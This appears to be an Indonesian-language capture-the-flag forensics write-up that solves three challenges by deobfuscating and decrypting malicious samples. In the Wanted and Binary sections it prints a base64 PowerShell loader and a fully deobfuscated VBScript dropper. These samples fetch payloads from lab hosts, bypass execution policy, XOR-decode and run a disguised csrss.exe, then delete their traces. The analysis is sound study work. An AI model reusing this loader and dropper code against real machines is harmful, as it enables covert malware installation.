## Foren/Frontier
94.237.54.116:52327 akses url docker
![image](https://github.com/user-attachments/assets/7436fe89-3fd9-42f4-a7bf-efba75220510)
base64 encoded flag di bash history

## Foren/Wanted
![image](https://github.com/user-attachments/assets/934a70b8-5b88-4683-9640-fcf2c5f30bee)

Url decode
![image](https://github.com/user-attachments/assets/f7b83bc5-0cfa-4bd3-969b-a5329bac14dc)

Decode vbscript
![image](https://github.com/user-attachments/assets/0a474caa-4b78-4c20-9ce4-a39824e5ce4f)

Donlot vbscript
![image](https://github.com/user-attachments/assets/0348e806-7a3e-44eb-a761-23deca0e084d)

Fungsi ini sus, dia semacam arrange base64 terus diexec sebagai payload, coba deobfus terus decode

```
import base64
def descortinar(data, pattern, replacement):
    """
    Mimics the VBScript `descortinar` function to replace obfuscation patterns.
    """
    return data.replace(pattern, replacement)

# Obfuscated Base64-like string
latifoliado = (
    "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZd2FudGVkCgXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1td2FudGVkCgTe"
    "XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2Vydmld2FudGVkCgjZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZd2FudGVkCgGl"
    "uZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgcd2FudGVkCg3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19d2FudGVkCgyc"
    "CcpKSkpd2FudGVkCgd2FudGVkCg"
)

parrana = "d2FudGVkCg"

# Step 1: Remove obfuscation patterns
decoded_data = descortinar(latifoliado, parrana, "")

# Step 2: Decode the Base64 string
def base64_decode(data):
    try:
        return base64.b64decode(data).decode('utf-8')
    except Exception as e:
        return f"Error decoding Base64: {e}"

# Decode the cleaned string
decoded_payload = base64_decode(decoded_data)

# Display the results
print("Decoded Payload:")
print(decoded_payload)

# Write to file (optional)
with open("decoded_payload.txt", "w") as file:
    file.write(decoded_payload)
```
![image](https://github.com/user-attachments/assets/69637eb1-346b-4d93-b5ee-3ec489348936)

Download urlnya terus dpt flag
![image](https://github.com/user-attachments/assets/3b81a0d4-fdbf-4aa0-9f18-c7e4a1d25933)

## Foren/Binary
Sus
![image](https://github.com/user-attachments/assets/20f09e1a-61d0-450d-9255-2fb16fda8ccc)

Deobfuscate https://obf-io.deobfuscate.io/ 
![image](https://github.com/user-attachments/assets/454847f5-7358-4a2d-9774-bc815b7b46b7)

Url decode
![image](https://github.com/user-attachments/assets/177b00ea-5db5-4046-a1f6-f1de8ad844ca)

CDATA sus
![image](https://github.com/user-attachments/assets/36fd3c7a-61d2-48a0-922b-d9a8548fea2d)

Variable TpHCM diobfuscate, kita deobfus pake chatgpt
```
obfuscated = """Stxmsr$I|tpmgmxHmq$sfnWlipp0$sfnJWS0$sfnLXXTHmq$wxvYVP50$wxvYVP60$wxvYVP70$wxvWls{jmpiYVPHmq$wxvHs{rpsehTexl50$wxvHs{rpsehTexl60$wxvHs{rpsehTexl70$wxvWls{jmpiTexlHmq$wxvI|igyxefpiTexl0$wxvTs{ivWlippWgvmtxwxvYVP5$A$&lxxt>33{mrhs{wythexi2lxf3gwvww2i|i&wxvYVP6$A$&lxxt>33{mrhs{wythexi2lxf3gwvww2hpp&wxvYVP7$A$&lxxt>33{mrhs{wythexi2lxf3gwvww2i|i2gsrjmk&wxvWls{jmpiYVP$A$&lxxt>33{mrhs{wythexi2lxf3{erxih2thj&wxvHs{rpsehTexl5$A$&G>`Ywivw`Tyfpmg`gwvww2i|i&wxvHs{rpsehTexl6$A$&G>`Ywivw`Tyfpmg`gwvww2hpp&wxvHs{rpsehTexl7$A$&G>`Ywivw`Tyfpmg`gwvww2i|i2gsrjmk&wxvWls{jmpiTexl$A$&G>`Ywivw`Tyfpmg`{erxih2thj&wxvI|igyxefpiTexl$A$&G>`Ywivw`Tyfpmg`gwvww2i|i&Wix$sfnWlipp$A$GviexiSfnigx,&[Wgvmtx2Wlipp&-Wix$sfnJWS$A$GviexiSfnigx,&Wgvmtxmrk2JmpiW}wxiqSfnigx&-Wix$sfnLXXT$A$GviexiSfnigx,&QW\QP62\QPLXXT&-Mj$Rsx$sfnJWS2JmpiI|mwxw,wxvHs{rpsehTexl5-$Xlir$$$$Hs{rpsehJmpi$wxvYVP50$wxvHs{rpsehTexl5Irh$MjMj$Rsx$sfnJWS2JmpiI|mwxw,wxvHs{rpsehTexl6-$Xlir$$$$Hs{rpsehJmpi$wxvYVP60$wxvHs{rpsehTexl6Irh$MjMj$Rsx$sfnJWS2JmpiI|mwxw,wxvHs{rpsehTexl7-$Xlir$$$$Hs{rpsehJmpi$wxvYVP70$wxvHs{rpsehTexl7Irh$MjMj$Rsx$sfnJWS2JmpiI|mwxw,wxvWls{jmpiTexl-$Xlir$$$$Hs{rpsehJmpi$wxvWls{jmpiYVP0$wxvWls{jmpiTexlIrh$MjwxvTs{ivWlippWgvmtx$A$c&teveq$,&$*$zfGvPj$*$c&$$$$_wxvmrka(JmpiTexl0&$*$zfGvPj$*$c&$$$$_wxvmrka(Oi}Texl&$*$zfGvPj$*$c&-&$*$zfGvPj$*$c&(oi}$A$_W}wxiq2MS2Jmpia>>ViehEppF}xiw,(Oi}Texl-&$*$zfGvPj$*$c&(jmpiGsrxirx$A$_W}wxiq2MS2Jmpia>>ViehEppF}xiw,(JmpiTexl-&$*$zfGvPj$*$c&(oi}Pirkxl$A$(oi}2Pirkxl&$*$zfGvPj$*$c&jsv$,(m$A$4?$(m$1px$(jmpiGsrxirx2Pirkxl?$(m//-$&$*$zfGvPj$*$c&$$$$(jmpiGsrxirx_(ma$A$(jmpiGsrxirx_(ma$1f|sv$(oi}_(m$)$(oi}Pirkxla&$*$zfGvPj$*$c&&$*$zfGvPj$*$c&_W}wxiq2MS2Jmpia>>[vmxiEppF}xiw,(JmpiTexl0$(jmpiGsrxirx-&$*$zfGvPjHmq$sfnJmpiSr$Ivvsv$Viwyqi$Ri|xWix$sfnJmpi$A$sfnJWS2GviexiXi|xJmpi,&G>`Ywivw`Tyfpmg`xiqt2tw5&0$Xvyi-Mj$Ivv2Ryqfiv$@B$4$Xlir$$$$[Wgvmtx2Igls$&Ivvsv$gviexmrk$Ts{ivWlipp$wgvmtx$jmpi>$&$*$Ivv2Hiwgvmtxmsr$$$$[Wgvmtx2UymxIrh$MjsfnJmpi2[vmxiPmri$wxvTs{ivWlippWgvmtxsfnJmpi2GpswiHmq$evvJmpiTexlwevvJmpiTexlw$A$Evve},wxvHs{rpsehTexl50$wxvHs{rpsehTexl70$wxvWls{jmpiTexl-Hmq$mJsv$m$A$4$Xs$YFsyrh,evvJmpiTexlw-$$$$Hmq$mrxVixyvrGshi$$$$mrxVixyvrGshi$A$sfnWlipp2Vyr,&ts{ivwlipp$1I|igyxmsrTspmg}$F}teww$1Jmpi$G>`Ywivw`Tyfpmg`xiqt2tw5$1JmpiTexl$&$*$Glv,78-$*$evvJmpiTexlw,m-$*$Glv,78-$*$&$1Oi}Texl$&$*$Glv,78-$*$wxvHs{rpsehTexl6$*$Glv,78-0$40$Xvyi-$$$$$$$$Mj$mrxVixyvrGshi$@B$4$Xlir$$$$$$$$[Wgvmtx2Igls$&Ts{ivWlipp$wgvmtx$i|igyxmsr$jempih$jsv$&$*$evvJmpiTexlw,m-$*$&${mxl$i|mx$gshi>$&$*$mrxVixyvrGshi$$$$Irh$MjRi|xsfnWlipp2Vyr$wxvI|igyxefpiTexl0$50$XvyisfnWlipp2Vyr$wxvWls{jmpiTexl0$50$XvyisfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`gwvww2hpp&sfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`gwvww2i|i&sfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`gwvww2i|i2gsrjmk&sfnJWS2HipixiJmpi$&G>`Ywivw`Tyfpmg`xiqt2tw5&Wyf$Hs{rpsehJmpi,yvp0$texl-$$$$Hmq$sfnWxvieq$$$$Wix$sfnWxvieq$A$GviexiSfnigx,&EHSHF2Wxvieq&-$$$$sfnLXXT2Stir$&KIX&0$yvp0$Jepwi$$$$sfnLXXT2Wirh$$$$Mj$sfnLXXT2Wxexyw$A$644$Xlir$$$$$$$$sfnWxvieq2Stir$$$$$$$$sfnWxvieq2X}ti$A$5$$$$$$$$sfnWxvieq2[vmxi$sfnLXXT2ViwtsrwiFsh}$$$$$$$$sfnWxvieq2WeziXsJmpi$texl0$6$$$$$$$$sfnWxvieq2Gpswi$$$$Irh$Mj$$$$Wix$sfnWxvieq$A$RsxlmrkIrh$Wyf"""
result = ""

for i in range(1, len(obfuscated) + 1):
    char = obfuscated[i - 1]  # Extract character at position i (1-indexed)
    adjusted_char = chr(ord(char) - 5 + 1)  # Apply transformation
    result += adjusted_char

print(result)
```

```
# Option Explicit
# Dim objShell, objFSO, objHTTP
# Dim strURL1, strURL2, strURL3, strShowfileURL
# Dim strDownloadPath1, strDownloadPath2, strDownloadPath3, strShowfilePath
# Dim strExecutablePath, strPowerShellScript
# strURL1 = "http://windowsupdate.htb/csrss.exe"
# strURL2 = "http://windowsupdate.htb/csrss.dll"
# strURL3 = "http://windowsupdate.htb/csrss.exe.config"
# strShowfileURL = "http://windowsupdate.htb/wanted.pdf"
# strDownloadPath1 = "C:\Users\Public\csrss.exe"
# strDownloadPath2 = "C:\Users\Public\csrss.dll"
# strDownloadPath3 = "C:\Users\Public\csrss.exe.config"
# strShowfilePath = "C:\Users\Public\wanted.pdf"
# strExecutablePath = "C:\Users\Public\csrss.exe"

# Set objShell = CreateObject("WScript.Shell")
# Set objFSO = CreateObject("Scripting.FileSystemObject")
# Set objHTTP = CreateObject("MSXML2.XMLHTTP")

# If Not objFSO.FileExists(strDownloadPath1) Then
#     DownloadFile strURL1, strDownloadPath1
# End If
# If Not objFSO.FileExists(strDownloadPath2) Then
#     DownloadFile strURL2, strDownloadPath2
# End If
# If Not objFSO.FileExists(strDownloadPath3) Then
#     DownloadFile strURL3, strDownloadPath3
# End If
# If Not objFSO.FileExists(strShowfilePath) Then
#     DownloadFile strShowfileURL, strShowfilePath
# End If

# strPowerShellScript = _
# "param (" & vbCrLf & _
# "    [string]$FilePath," & vbCrLf & _      
# "    [string]$KeyPath" & vbCrLf & _        
# ")" & vbCrLf & _
# "$key = [System.IO.File]::ReadAllBytes($KeyPath)" & vbCrLf & _
# "$fileContent = [System.IO.File]::ReadAllBytes($FilePath)" & vbCrLf & _
# "$keyLength = $key.Length" & vbCrLf & _    
# "for ($i = 0; $i -lt $fileContent.Length; $i++) {" & vbCrLf & _
# "    $fileContent[$i] = $fileContent[$i] -bxor $key[$i % $keyLength]" & vbCrLf & _    
# "}" & vbCrLf & _
# "[System.IO.File]::WriteAllBytes($FilePath, $fileContent)" & vbCrLf

# Dim objFile
# On Error Resume Next
# Set objFile = objFSO.CreateTextFile("C:\Users\Public\temp.ps1", True)
# If Err.Number <> 0 Then
#     WScript.Echo "Error creating PowerShell script file: " & Err.Description
#     WScript.Quit
# End If
# objFile.WriteLine strPowerShellScript      
# objFile.Close

# Dim arrFilePaths
# arrFilePaths = Array(strDownloadPath1, strDownloadPath3, strShowfilePath)

# Dim i
# For i = 0 To UBound(arrFilePaths)
#     Dim intReturnCode
#     intReturnCode = objShell.Run("powershell -ExecutionPolicy Bypass -File C:\Users\Public\temp.ps1 -FilePath " & Chr(34) & arrFilePaths(i) & Chr(34) & " -KeyPath " & Chr(34) & strDownloadPath2 & Chr(34), 0, True)  

#     If intReturnCode <> 0 Then
#         WScript.Echo "PowerShell script execution failed for " & arrFilePaths(i) & " with exit code: " & intReturnCode
#     End If
# Next

# objShell.Run strExecutablePath, 1, True    
# objShell.Run strShowfilePath, 1, True      
# objFSO.DeleteFile "C:\Users\Public\csrss.dll"
# objFSO.DeleteFile "C:\Users\Public\csrss.exe"
# objFSO.DeleteFile "C:\Users\Public\csrss.exe.config"
# objFSO.DeleteFile "C:\Users\Public\temp.ps1"

# Sub DownloadFile(url, path)
#     Dim objStream
#     Set objStream = CreateObject("ADODB.Stream")
#     objHTTP.Open "GET", url, False
#     objHTTP.Send
#     If objHTTP.Status = 200 Then
#         objStream.Open
#         objStream.Type = 1
#         objStream.Write objHTTP.ResponseBody
#         objStream.SaveToFile path, 2      
#         objStream.Close
#     End If
#     Set objStream = Nothing
# End Sub
```

Download fileUrl nya dan decrypt

```
# XOR Decryption Script
# Purpose: Decrypt files using the provided XOR key without executing any malicious actions.

import os

def xor_decrypt(file_path, key_path, output_path):
    """
    Decrypt a file using the XOR key.
    :param file_path: Path to the encrypted file.
    :param key_path: Path to the XOR key file.
    :param output_path: Path to save the decrypted file.
    """
    try:
        with open(key_path, 'rb') as key_file:
            key = key_file.read()

        with open(file_path, 'rb') as encrypted_file:
            file_content = bytearray(encrypted_file.read())

        key_length = len(key)
        for i in range(len(file_content)):
            file_content[i] ^= key[i % key_length]

        with open(output_path, 'wb') as decrypted_file:
            decrypted_file.write(file_content)

        print(f"Decrypted {file_path} to {output_path}")

    except Exception as e:
        print(f"Error decrypting {file_path}: {e}")

# Paths to the files
files_to_decrypt = [
    "csrss.exe",
    "csrss.exe.config",
    "csrss.dll",
    "wanted.pdf",
]

key_path = "csrss.dll"  # Path to the XOR key file
output_directory = "\\decrypted_files"

# Create the output directory if it doesn't exist
os.makedirs(output_directory, exist_ok=True)

# Decrypt the files
for file_path in files_to_decrypt:
    file_name = os.path.basename(file_path)
    output_path = os.path.join(output_directory, f"decrypted_{file_name}")
    xor_decrypt(file_path, key_path, output_path)

print("Decryption completed. Decrypted files are saved in", output_directory)
```
![image](https://github.com/user-attachments/assets/45796257-18af-463c-aae7-9a9c2f4ce928)

Download, isi jsonya executable (liat magic bytes MZ)

Reverse engineer pake dnSpy
![image](https://github.com/user-attachments/assets/b4d23bc2-9b32-4c48-8039-8c8c6ec9b6f3)

Bikin decryptor
Key: sha256 value dari mintpumpedowl
Iv ttp utf-8 dari cream_hollow_tiket

```
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
import base64

# Constants
cream_hollow_ticket = "tbbliftalildywic"
mint_pumped_owl = "vudzvuokmioomyialpkyydvgqdmdkdxy"

# Derive key and IV
iv = cream_hollow_ticket.encode('utf-8')
key = SHA256.new(mint_pumped_owl.encode('utf-8')).digest()

# Base64 encoded ciphertext
ciphertext_b64 = "ZzfccaKJB3CrDvOnj/6io5OR7jZGL0pr0sLO/ZcRNSa1JLrHA+k2RN1QkelHxKVvhrtiCDD14Aaxc266kJOzF59MfhoI5hJjc5hx7kvGAFw="
ciphertext = base64.b64decode(ciphertext_b64)

# Decrypt using AES (CBC mode with zero padding)
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext_padded = cipher.decrypt(ciphertext)

# Remove zero padding
plaintext = plaintext_padded.rstrip(b'\x00')

# Decode to string
print("Decrypted plaintext:", plaintext.decode('utf-8'))
```

Decrypted plaintext: http://windowsupdate.htb/ec285935b46229d40b95438707a7efb2282f2f02.xml
![image](https://github.com/user-attachments/assets/93029cf7-89a5-449e-851d-29f1320f767e)

Donlod xmlnya, flag di situ
